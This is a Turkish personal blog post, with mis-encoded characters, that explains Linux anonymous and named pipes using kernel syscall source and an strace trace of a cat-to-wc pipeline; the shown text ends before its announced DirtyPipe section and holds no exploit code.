<!DOCTYPE html>
<!--[if lt IE 7]>      <html lang="tr" class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html lang="tr" class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html lang="tr" class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html lang="tr" class="no-js"> <!--<![endif]-->
    <head>
        <meta charset="utf-8">
        <title>    Linux/Unix sistemlerde Borular ve DirtyPipe
</title>
                    <meta property="article:tag" content="linux pipes" />
                    <meta property="article:tag" content="linux borular" />
                    <meta property="article:tag" content="pipe nedir" />
                    <meta property="article:tag" content="linux pipes tÃ¼rkÃ§e" />
                    <meta property="article:tag" content="iÅŸletim sistemi borular" />
                    <meta property="article:tag" content="iÅŸletim sistemlerinde borular" />
                    <meta property="article:tag" content="iÅŸletim sistemlerinde pipelar" />
                    <meta property="article:tag" content="pipe ne demek" />
                    <meta property="article:tag" content="dirtypipe" />
                    <meta property="article:tag" content="anonymous pipe" />
                    <meta property="article:tag" content="isimsiz pipe" />
                    <meta property="article:tag" content="isimli pipe" />
                    <meta property="article:tag" content="isimsiz borular" />
                    <meta property="article:tag" content="isimli borular" />
                    <meta property="article:tag" content="named pipes" />

	<link rel="canonical" href="https://enesergun.net/linuxunix-sistemlerde-borular-ve-dirtypipe.html"/>
  
        <meta name="viewport" content="width=device-width, initial-scale=1">
        
        <link rel="stylesheet" href="theme/css/cid.css">
        <link href="https://enesergun.net/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Enes ErgÃ¼n Atom Feed" />
        <style>
                

        pre {
            font-family: "", "Lucida Console", monospace, Monaco;
            font-size: 14px;
            line-height: 1.0;
        }

        a {
            color: #da4b6d;
            text-decoration: none;
        }

        w {
            color: white;
        }

        e {
            color: #93ffd7;
        }

        /* green  */
        k {
            color: #ff93f1;
        }

        /* pink   */
        l {
            color: #f1ff93;
        }

        /* yellow */
        o {
            color: #93f1ff;
        }

        /* blue   */
        r {
            color: #fa4d57;
        }

        /* red    */

        body {
            font-family: "", "Lucida Console", monospace, Monaco
        }

        h1 {
            color: #da4b6d !important;
        }

        .blog-header {
            text-align: center;
        }

        header[role="banner"] {
            #logo-main {
                display: block;
                margin: 20px auto;
            }
        }

        #navbar-primary.navbar-default {
            background: transparent;
            border: none;

            text-align: center;
            display: inline-block;
            float: none;
            padding-left: 30px;
            padding-right: 30px;
            width: 100%;
            border-style: groove;
            border-color: #ff93f1;
        }
        </style>
    </head>
    <body>
        <!--[if lt IE 7]>
            <p class="chromeframe">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> or <a href="http://www.google.com/chromeframe/?redirect=true">activate Google Chrome Frame</a> to improve your experience.</p>
        <![endif]-->

            <div class="container">

<header class="blog-header">
    <h1><a href="https://enesergun.net" class="glitch" data-text="Enes ErgÃ¼n">Enes ErgÃ¼n</a></h1>
    <p> Personel homepage </p>
    <nav>
        <a href="https://enesergun.net/">INDEX</a>
        <a href="https://enesergun.net/archives">ARCHIVES</a>
        <a href="https://enesergun.net/categories">CATEGORIES</a>
    </nav>
</header>

    <div class="post">

        <header>
            <h1>Linux/Unix sistemlerde Borular ve DirtyPipe</h1>
            <p class="date">Written on <time datetime="2023-10-11T22:00:00+03:00">Oct 11, 2023</time></p>
            
        </header>

        <article>
            <h1>Linux/Unix sistemlerde Borular ve DirtyPipe</h1>
<blockquote>
<p>Ã–ncelikle yazÄ±ya borularÄ±n orjinal isminin â€œ<strong>PIPE</strong>â€ olduÄŸuyla giriÅŸ yapmak istiyorum. Ã‡alÄ±ÅŸma yapÄ±sÄ± itibariyle boru gibi olduÄŸu iÃ§in borular ÅŸeklinde bahsedeceÄŸim ama siz yine de PIPE diye bilin. Biliyorsunuz ki TÃ¼rkÃ§e teknik kitaplarda Ä°ngilizce teknik terimlerin direkt Ã§evirisi dolayÄ±sÄ±yla bolca sÄ±kÄ±ntÄ± yaÅŸÄ±yoruz.</p>
</blockquote>
<h2>Girizgah</h2>
<p>Bir Ã¶nceki post olan <a href="[https://enesergun.net/windows-sistemlerde-borularpipe.html](https://enesergun.net/windows-sistemlerde-borularpipe.html)">Windows Sistemlerde Borular (PIPE)</a> yazÄ±sÄ±nda iÅŸletim sistemleri arasÄ± iletiÅŸim serisi ÅŸeklinde blog konularÄ±ndan gideceÄŸimi yazmÄ±ÅŸtÄ±m. BakmayÄ±n ben de Ã¶ÄŸrenip, araÅŸtÄ±rÄ±p yazÄ±yorum. BildiÄŸime deÄŸil yani. Her neyse bu blog yazÄ±sÄ±ndaki konumuz da bir Ã¶nceki ile benzer olarak Linux sistemlerde Borular ÅŸeklinde olacak.</p>
<h2>NeymiÅŸ bu borular?</h2>
<p>Linuxâ€™a ucundan kÃ¶ÅŸesinden dokunmuÅŸ herkes en azÄ±ndan aÅŸaÄŸÄ±daki komutu yazmÄ±ÅŸtÄ±r.</p>
<div class="highlight"><pre><span></span><code><span class="n">cat</span><span class="w"> </span><span class="n">foo</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="s">&quot;bar&quot;</span><span class="w"></span>
</code></pre></div>

<p>Ä°lgili komut <strong>cat</strong> komutuna verilen ilk argÃ¼man olan dosyayÄ± okuyup daha sonra <strong>PIPEâ€™layarak</strong> dan sonraki processâ€™e iletiyor. Ä°kinci kÄ±sÄ±mdaki uygulama olan <strong>grep</strong> de bu outputu alarak iÅŸliyor ve Ã§Ä±ktÄ±sÄ±nÄ± ekrana veriyor. Tabi bÃ¼tÃ¼n bu iÅŸlemler memory Ã¼zerinde gerÃ§ekleÅŸiyor. Burada FIFO (First-in First-out) olarak Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± belirtmekte yarar var. Fakat FIFO iÃ§in aÅŸaÄŸÄ±da ayrÄ± bir baÅŸlÄ±k aÃ§acaÄŸÄ±z inÅŸ. Borulara Ã§alÄ±ÅŸma seviyesi aÃ§Ä±sÄ±ndan bakarsak da <strong>user land &gt; kernel land &gt; user land</strong> ÅŸeklinde bir akÄ±ÅŸ Ã§izebiliriz. User land ile kernel land adres alanlarÄ± kullanÄ±lÄ±yor. BurasÄ± <strong>Ã§okomelli</strong>. </p>
<p>YukarÄ±daki Ã¶rnek sh komutu iÃ§in: â€œAbi grep ile catâ€™i aynÄ± anda niye kullanÄ±yorsun fazladan process Ã§alÄ±ÅŸtÄ±rÄ±yorsun diyenlerin aÄŸzÄ±na kÃ¼rekle vururum.â€ Neyse, kÄ±saca Ã¶zetlersek:</p>
<p>cat ile standart input(<strong>stdin</strong>)â€™tan okunan veri standart output(<strong>stdout</strong>) ile pipelanarak grep komutunun standart inputâ€™una veriyi gÃ¶nderiyor. Bir de tabi bunun standart error (stderr) kÄ±smÄ± var.</p>
<p>Linux Ã¼zerindeki <strong>File Descriptorlara</strong> kÄ±saca gÃ¶z atarsak, ÅŸimdilik bu kadarÄ± yeterli olacaktÄ±r diye dÃ¼ÅŸÃ¼nÃ¼yorum:</p>
<ul>
<li>stdin = fd 0</li>
<li>stdout = fd 1</li>
<li>stderr = fd 2</li>
</ul>
<p>TÄ±pkÄ± Windowsda olduÄŸu gibi Linux sistemlerde de borular ikiye ayrÄ±lÄ±yor. Bu ayrÄ±m yine aynÄ± ÅŸekilde:</p>
<ul>
<li>Anonymous Pipes</li>
<li>Named Pipes</li>
</ul>
<p>DiÄŸer sistemlerden farklÄ± olarak Linux sistemlerde Ã¶nemli bir fark bulunuyor. Bu fark linux Ã¼zerinde borularÄ±n bufferlanarak kullanÄ±lmasÄ±ndan kaynaklanmaktadÄ±r. Buffer boyutu olarak da Wikipediaâ€™da yazana gÃ¶re 64KiB olarak belirtilmekte fakat aslÄ±nda sistem bazÄ±nda page sizeâ€™a gÃ¶re belirleniyor. Linux 2.6.11â€™den beri 16 page sizeâ€™a eÅŸit olarak geldiÄŸi belirtiliyor. Pek tabii farklÄ± 3rd party filtre kullanarak bu boru boyutu artÄ±rÄ±labiliyor. Bufferlama Ã¶zelliÄŸi iÃ§in aÅŸaÄŸÄ±daki halk aÄŸzÄ±yla olan girdi basitleÅŸtirmek iÃ§in kullanÄ±labilir sanÄ±rÄ±m:</p>
<blockquote>
<p>Ä°lk processâ€™in Ã§Ä±ktÄ±sÄ± bufferâ€™Ä± doldurarak ikinci processâ€™i besler eÄŸer buffer boÅŸalmamÄ±ÅŸsa yani ikinci process veriyi alÄ±p bufferÄ± silmediyse ilk process durur(blocking) ve bekler.
</p>
</blockquote>
<p>BorularÄ±n Byte Stream olarak kullanÄ±lÄ±yor olduÄŸunu biliyoruz fakat man sayfasÄ±na baktÄ±ÄŸÄ±mÄ±zda aslÄ±nda <strong>Linux 3.4â€™den</strong> beri <strong>O_DIRECT</strong> flagi ile birlikte packet modunda da pipe oluÅŸturabildiÄŸimizi gÃ¶rebiliriz. BurasÄ± Ã¶nemli bir nokta. DiÄŸer deÄŸinmemiz gereken flag ise <strong>O_NONBLOCK</strong> flagidir. Ä°lgili flag ile de borunun blocking moduna karar verebiliyoruz.</p>
<h2>Åimdi Daha Derine</h2>
<p>YukarÄ±da Linux Ã¼zerinde 2 tÃ¼r boru olduÄŸundan bahsetmiÅŸtik. Genel anlamda biz borularÄ± kullanÄ±rken <strong><em>*</em></strong><strong><em>â€œ|â€</em></strong><strong><em>*</em></strong> iÅŸaretini kullansak da Ä°simli borular iÃ§in FIFOs terimi kullanÄ±lÄ±yor. </p>
<h3>Ä°simsiz borular</h3>
<p>AslÄ±nda yazÄ±nÄ±n bu kÄ±smÄ±na kadar genel anlamda â€œAnonymous Pipesâ€ dan bahsettik ama ayÄ±rmamÄ±z gerekiyor. </p>
<p>Linux Ã¼zerindeki implementasyona baktÄ±ÄŸÄ±mÄ±zda â€œpipe()â€ (<strong>Not: pipe() ve pipe2() ile birlikte</strong>) sistem Ã§aÄŸrÄ±sÄ±yla boru oluÅŸturabiliyoruz. Ä°lgili sistem Ã§aÄŸrÄ±sÄ± ise do_pipe fonksiyonunu Ã§alÄ±ÅŸtÄ±rÄ±yor ve geri dÃ¶nÃ¼ÅŸ olarak bize 2 adet file descriptor dÃ¶nÃ¼yor. </p>
<p><a href="https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c#L1010">https://elixir.bootlin.com/linux/v5.11.14/source/fs/pipe.c</a></p>
<div class="highlight"><pre><span></span><code><span class="n">SYSCALL_DEFINE2</span><span class="p">(</span><span class="n">pipe2</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="n">fildes</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">,</span><span class="w"> </span><span class="n">flags</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">do_pipe2</span><span class="p">(</span><span class="n">fildes</span><span class="p">,</span><span class="w"> </span><span class="n">flags</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>

<span class="n">SYSCALL_DEFINE1</span><span class="p">(</span><span class="n">pipe</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="p">,</span><span class="w"> </span><span class="n">fildes</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">do_pipe2</span><span class="p">(</span><span class="n">fildes</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">do_pipe2</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="n">fildes</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">flags</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">file</span><span class="w"> </span><span class="o">*</span><span class="n">files</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">error</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">error</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__do_pipe_flags</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">files</span><span class="p">,</span><span class="w"> </span><span class="n">flags</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">copy_to_user</span><span class="p">(</span><span class="n">fildes</span><span class="p">,</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">fd</span><span class="p">))))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">fput</span><span class="p">(</span><span class="n">files</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="w"></span>
<span class="w">            </span><span class="n">fput</span><span class="p">(</span><span class="n">files</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w"></span>
<span class="w">            </span><span class="n">put_unused_fd</span><span class="p">(</span><span class="n">fd</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="w"></span>
<span class="w">            </span><span class="n">put_unused_fd</span><span class="p">(</span><span class="n">fd</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w"></span>
<span class="w">            </span><span class="n">error</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="n">fd_install</span><span class="p">(</span><span class="n">fd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w"> </span><span class="n">files</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="w"></span>
<span class="w">            </span><span class="n">fd_install</span><span class="p">(</span><span class="n">fd</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="n">files</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">error</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div>

<p>Default olarak borularÄ±n max boyutu iÃ§in: </p>
<div class="highlight"><pre><span></span><code><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">fs</span><span class="o">/</span><span class="n">pipe</span><span class="o">-</span><span class="n">max</span><span class="o">-</span><span class="n">size</span><span class="w"></span>
<span class="n">$</span><span class="o">&gt;</span><span class="w"> </span><span class="mi">1048576</span><span class="w"></span>
</code></pre></div>

<p>Bir pipe oluÅŸturduÄŸumuzda yapÄ±lan Ã§aÄŸrÄ±larÄ± takip etmek iÃ§in strace kullanalÄ±m ve bazÄ± sistem Ã§aÄŸrÄ±larÄ±nÄ± takip edelim. Bunlar: execve, pipe, write ve read Ã§aÄŸrÄ±larÄ±.</p>
<p>Komut:</p>
<div class="highlight"><pre><span></span><code><span class="n">strace</span><span class="w"> </span><span class="o">-</span><span class="n">qf</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="n">execve</span><span class="p">,</span><span class="n">pipe</span><span class="p">,</span><span class="n">write</span><span class="p">,</span><span class="n">read</span><span class="w"> </span>\
<span class="n">sh</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="err">&#39;</span><span class="n">cat</span><span class="w"> </span><span class="n">temp</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">wc</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="err">&#39;</span><span class="w"></span>
</code></pre></div>

<p>Output:</p>
<div class="highlight"><pre><span></span><code><span class="n">execve</span><span class="p">(</span><span class="s">&quot;/usr/bin/sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s">&quot;sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;-c&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;cat temp.txt | wc -c&quot;</span><span class="p">],</span><span class="w"> </span><span class="mh">0xffffd2c6a6d8</span><span class="w"> </span><span class="cm">/* 55 vars */</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
<span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\177</span><span class="s">ELF</span><span class="se">\2\1\1\3\0\0\0\0\0\0\0\0\3\0\267\0\1\0\0\0</span><span class="s">py</span><span class="se">\2\0\0\0\0\0</span><span class="s">&quot;</span><span class="p">...,</span><span class="w"> </span><span class="mi">832</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">832</span><span class="w"></span>
<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517067</span><span class="p">]</span><span class="w"> </span><span class="n">execve</span><span class="p">(</span><span class="s">&quot;/usr/bin/cat&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s">&quot;cat&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;temp.txt&quot;</span><span class="p">],</span><span class="w"> </span><span class="mh">0xaaaad55eaef8</span><span class="w"> </span><span class="cm">/* 55 vars */</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517067</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\177</span><span class="s">ELF</span><span class="se">\2\1\1\3\0\0\0\0\0\0\0\0\3\0\267\0\1\0\0\0</span><span class="s">py</span><span class="se">\2\0\0\0\0\0</span><span class="s">&quot;</span><span class="p">...,</span><span class="w"> </span><span class="mi">832</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">832</span><span class="w"></span>
<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517068</span><span class="p">]</span><span class="w"> </span><span class="n">execve</span><span class="p">(</span><span class="s">&quot;/usr/bin/wc&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s">&quot;wc&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;-c&quot;</span><span class="p">],</span><span class="w"> </span><span class="mh">0xaaaad55eaf28</span><span class="w"> </span><span class="cm">/* 55 vars */</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
<span class="o">**</span><span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517067</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;imam hatipler kapatilsin</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">131072</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">25</span><span class="o">**</span><span class="w"></span>
<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517068</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w">  </span><span class="o">&lt;</span><span class="n">unfinished</span><span class="w"> </span><span class="p">...</span><span class="o">&gt;</span><span class="w"></span>
<span class="o">**</span><span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517067</span><span class="p">]</span><span class="w"> </span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;imam hatipler kapatilsin</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">25</span><span class="w"> </span><span class="o">&lt;</span><span class="n">unfinished</span><span class="w"> </span><span class="p">...</span><span class="o">&gt;**</span><span class="w"></span>
<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517068</span><span class="p">]</span><span class="w"> </span><span class="o">&lt;</span><span class="p">...</span><span class="w"> </span><span class="n">read</span><span class="w"> </span><span class="n">resumed</span><span class="o">&gt;</span><span class="s">&quot;</span><span class="se">\177</span><span class="s">ELF</span><span class="se">\2\1\1\3\0\0\0\0\0\0\0\0\3\0\267\0\1\0\0\0</span><span class="s">py</span><span class="se">\2\0\0\0\0\0</span><span class="s">&quot;</span><span class="p">...,</span><span class="w"> </span><span class="mi">832</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">832</span><span class="w"></span>
<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517067</span><span class="p">]</span><span class="w"> </span><span class="o">&lt;</span><span class="p">...</span><span class="w"> </span><span class="n">write</span><span class="w"> </span><span class="n">resumed</span><span class="o">&gt;</span><span class="p">)</span><span class="w">       </span><span class="o">=</span><span class="w"> </span><span class="mi">25</span><span class="w"></span>
<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517067</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">131072</span><span class="p">)</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517067</span><span class="p">]</span><span class="w"> </span><span class="o">+++</span><span class="w"> </span><span class="n">exited</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">+++</span><span class="w"></span>
<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517066</span><span class="p">]</span><span class="w"> </span><span class="o">---</span><span class="w"> </span><span class="n">SIGCHLD</span><span class="w"> </span><span class="p">{</span><span class="n">si_signo</span><span class="o">=</span><span class="n">SIGCHLD</span><span class="p">,</span><span class="w"> </span><span class="n">si_code</span><span class="o">=</span><span class="n">CLD_EXITED</span><span class="p">,</span><span class="w"> </span><span class="n">si_pid</span><span class="o">=</span><span class="mi">517067</span><span class="p">,</span><span class="w"> </span><span class="n">si_uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">,</span><span class="w"> </span><span class="n">si_status</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">si_utime</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">si_stime</span><span class="o">=</span><span class="mi">0</span><span class="p">}</span><span class="w"> </span><span class="o">---</span><span class="w"></span>
<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517068</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;# Locale name alias data base.</span><span class="se">\n</span><span class="s">#&quot;</span><span class="p">...,</span><span class="w"> </span><span class="mi">4096</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2996</span><span class="w"></span>
<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517068</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">4096</span><span class="p">)</span><span class="w">          </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
<span class="o">**</span><span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517068</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;imam hatipler kapatilsin</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">16384</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">25</span><span class="o">**</span><span class="w"></span>
<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517068</span><span class="p">]</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">16384</span><span class="p">)</span><span class="w">         </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517068</span><span class="p">]</span><span class="w"> </span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;25</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">325</span><span class="w"></span>
<span class="p">)</span><span class="w">        </span><span class="o">=</span><span class="w"> </span><span class="mi">3</span><span class="w"></span>
<span class="p">[</span><span class="n">pid</span><span class="w"> </span><span class="mi">517068</span><span class="p">]</span><span class="w"> </span><span class="o">+++</span><span class="w"> </span><span class="n">exited</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">+++</span><span class="w"></span>
<span class="o">---</span><span class="w"> </span><span class="n">SIGCHLD</span><span class="w"> </span><span class="p">{</span><span class="n">si_signo</span><span class="o">=</span><span class="n">SIGCHLD</span><span class="p">,</span><span class="w"> </span><span class="n">si_code</span><span class="o">=</span><span class="n">CLD_EXITED</span><span class="p">,</span><span class="w"> </span><span class="n">si_pid</span><span class="o">=</span><span class="mi">517068</span><span class="p">,</span><span class="w"> </span><span class="n">si_uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">,</span><span class="w"> </span><span class="n">si_status</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">si_utime</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">si_stime</span><span class="o">=</span><span class="mi">0</span><span class="p">}</span><span class="w"> </span><span class="o">---</span><span class="w"></span>
<span class="o">+++</span><span class="w"> </span><span class="n">exited</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">+++</span><span class="w"></span>
</code></pre></div>

<p>Ä°lgili Ã§Ä±ktÄ±da dikkat ederseniz PID numarasÄ± +1 olarak iki ayrÄ± process olarak geliyor. Bunun sebebi biz ilgili komutu gerÃ§ekleÅŸtirdiÄŸimizde aslÄ±nda uygulamalar Ã¼zerinde borularÄ±n doÄŸasÄ± gereÄŸi bir deÄŸiÅŸim yapmÄ±yoruz. Ä°lgili programlar normal bir sÃ¼reÃ§miÅŸ gibi stdin ve stdoutâ€™larÄ±nÄ± alÄ±yorlar. Burada magic olan kÄ±sÄ±m direkt olarak borular oluyor. 2 processâ€™in normal ÅŸartlarda birbirinden haberi yok. Fakat; eÄŸer biraz <a href="http://pwn.college">pwn.college</a> Ã§Ã¶zmÃ¼ÅŸseniz orada gÃ¶rmÃ¼ÅŸ olacaÄŸÄ±nÄ±z gibi processlerin Ã§alÄ±ÅŸma mantÄ±ÄŸÄ±ndan dolayÄ± bizi deÄŸer ileten programÄ± child-parent process( Ã§Ã¼nkÃ¼ fork ğŸ™‚Â ) iliÅŸkisi iÃ§erisinde gÃ¶rebilir ve kontrol edebilirsiniz.  </p>
<h2>Ä°simli Borular / Named Pipes</h2>
<p>Linux Ã¼zerinde isimli borularÄ±n, isimsiz borulardan Ã§ok da bir farkÄ± yok aslÄ±nda amaâ€¦ Bu zat-Ä± muhteremlerin en bÃ¼yÃ¼k farkÄ± kendilerinin aslÄ±nda bir persistency (kalÄ±cÄ±lÄ±k) sunmasÄ±. Ä°simsiz borularda her ÅŸey iki process arasÄ±nda memory ile paylaÅŸÄ±lÄ±rken burada bir virtual file system Ã¼zerinden okunup, yazÄ±lÄ±yor. DoÄŸal olarak siz bir isimli boru oluÅŸturduÄŸunuzda diÄŸer sessionlarÄ±nÄ±z ile de ilgili boru Ã¼zerinde iÅŸlem yapabiliyorsunuz. Bu da bize bÃ¼yÃ¼k bir esneklik saÄŸlÄ±yor. </p>
<p>Her neyseâ€¦ Linux Ã¼zerinde isimli boru oluÅŸturmak iÃ§in 2 adet komutumuz bulunuyor. Bunlar:</p>
<ol>
<li>mknod</li>
<li>mkfifo</li>
</ol>
<p>Ã–rnek olarak ebucehil adÄ±nda bir pipe oluÅŸturdum. Ben artÄ±k istediÄŸim process veya session ile buraya yazabilir ve buradan okuyabilirim.</p>
